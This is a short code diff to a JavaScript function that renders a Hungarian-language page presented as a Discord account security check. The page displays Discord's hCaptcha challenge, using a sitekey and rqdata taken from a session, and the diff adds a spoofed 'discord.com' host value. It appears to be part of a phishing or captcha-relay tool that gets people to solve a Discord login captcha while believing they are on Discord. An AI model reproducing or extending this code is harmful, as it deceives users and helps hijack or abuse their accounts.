@@ -156,7 +156,7 @@ export function renderCaptchaPage(session) {
     <p>A Discord felhős biztonsági ellenőrzést kér a fiókodhoz. Kattints az alábbi dobozra a bejelentkezés véglegesítéséhez!</p>
 
     <div class="captcha-container">
-      <div id="hcaptcha-widget"></div>
+      <div id="hcaptcha-widget" data-host="discord.com"></div>
     </div>
 
     <div id="status" class="status-box">⏳ Várakozás a captcha kitöltésére...</div>
@@ -173,6 +173,7 @@ export function renderCaptchaPage(session) {
       hcaptcha.render('hcaptcha-widget', {
         sitekey: ${safeSitekey},
         rqdata: ${safeRqdata},
+        host: 'discord.com',
         theme: 'dark',
         callback: function(token) {
           var status = document.getElementById('status');
